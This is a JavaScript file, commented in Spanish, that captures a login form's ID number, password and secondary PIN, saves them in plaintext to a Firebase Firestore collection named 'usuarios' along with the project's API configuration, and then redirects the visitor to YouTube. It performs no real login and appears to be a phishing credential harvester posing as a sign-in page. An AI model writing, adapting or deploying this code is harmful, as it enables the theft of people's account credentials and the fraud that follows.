// Importar Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-firestore.js";

// Configuración de Firebase
const firebaseConfig = {
  apiKey: "AIzaSyCBdMdLOUf6AVnEo34GrwIJgPAFQd-5IN4",
  authDomain: "zowers-52e08.firebaseapp.com",
  databaseURL: "https://zowers-52e08-default-rtdb.firebaseio.com",
  projectId: "zowers-52e08",
  storageBucket: "zowers-52e08.appspot.com",
  messagingSenderId: "708761834926",
  appId: "1:708761834926:web:796f13d34ba543167de43f"
};

// Inicializar Firebase y Firestore
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Función para guardar datos en Firestore
async function guardarDatos(documento, password, clave) {
  try {
    await addDoc(collection(db, "usuarios"), {
      documento: documento,
      password: password,
      clave: clave,
      fecha: new Date()
    });
    alert("Datos guardados correctamente");
    window.location.href = "https://www.youtube.com/"; // Redirigir a YouTube
  } catch (error) {
    alert("Error al guardar datos: " + error);
  }
}

// Capturar el formulario
document.addEventListener("DOMContentLoaded", function () {
  document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault(); // Evitar recarga de página

    let documento = document.getElementById("documento").value;
    let password = document.getElementById("password").value;
    let clave = document.getElementById("clave").value;

    guardarDatos(documento, password, clave); // Guardar datos en Firebase
  });
});
